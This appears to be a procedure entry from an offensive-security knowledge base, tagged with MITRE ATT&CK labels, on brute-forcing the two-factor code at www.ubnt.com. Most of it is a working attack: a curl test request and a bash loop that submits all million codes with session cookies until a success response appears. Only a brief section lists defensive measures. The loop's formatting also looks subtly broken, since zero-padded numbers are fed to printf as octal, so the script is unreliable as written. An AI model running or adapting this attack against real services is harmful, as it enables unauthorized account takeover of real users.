---
tags:
  - brute-force
  - auth-bypass
  - 2fa-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ubnt-2fa-submit]]'
platforms:
  - Web
techniques:
  - '[[Brute Force]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7373c196-3239-4409-b040-a148aabbb9c3
created_at: '2025-12-14T17:31:19.773Z'
updated_at: '2025-12-14T17:31:19.773Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Brute-Force-2FA-Code-Submission

## Summary

This procedure exploits the absence of rate limiting on Ubiquiti's 2FA verification endpoint by rapidly submitting guesses for the 6-digit code, achieving full account access.

## Description

Following primary credential submission, the 2FA endpoint on www.ubnt.com accepts unlimited code attempts without CAPTCHA or delays, allowing a brute-force attack against the 1,000,000 possible 6-digit combinations. The attack uses the session from the prior step and iterates through codes until success. Target environment is the web login flow; outcomes include unauthorized dashboard access. Prerequisites: Active session cookies and basic scripting knowledge.

## Requirements

1. Session cookies from successful primary login
2. Knowledge of 6-digit code format (000000-999999)
3. curl and bash for looping requests

## Defense

Defensive measures and detection strategies:

- Enforce rate limiting (e.g., 5 attempts per minute) on 2FA submissions
- Introduce progressive delays or CAPTCHA after failed attempts
- Log and alert on high-volume code submissions from a single session

## Objectives

1. Submit multiple invalid 2FA codes without restriction
2. Identify the correct code through exhaustive guessing
3. Complete authentication and access account resources

## Instructions

### Step 1: Single Code Submission Test

**Context**: Test the 2FA endpoint with a sample code using the session to confirm no immediate restrictions.

**Command** ([[commands/curl-ubnt-2fa-submit]]):
```bash
curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=123456" -v
```

> This sends a test code; expected output is a failure response (e.g., 401) without lockout, indicating brute-force feasibility.

### Step 2: Automated Brute-Force Loop

**Context**: Script a loop to try all possible codes sequentially until success.

**Command** ([[commands/curl-ubnt-2fa-submit]]):
```bash
for code in {000000..999999}; do
  printf "Trying %06d\n" $code
  response=$(curl -s -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=$(printf %06d $code)")
  if echo "$response" | grep -qi "success\|dashboard"; then
    echo "Success with code: $(printf %06d $code)"
    break
  fi
  sleep 0.1

done
```

> The loop formats codes as 6 digits, checks for success indicators in the response, and breaks on match. Expected output: Success message with the working code after potentially many attempts (average ~500,000 for random code).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Brute Force]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ubnt-2fa-submit]]

## Tools Used


## Tags

- [[brute-force]]
- [[auth-bypass]]
- [[2fa-bypass]]
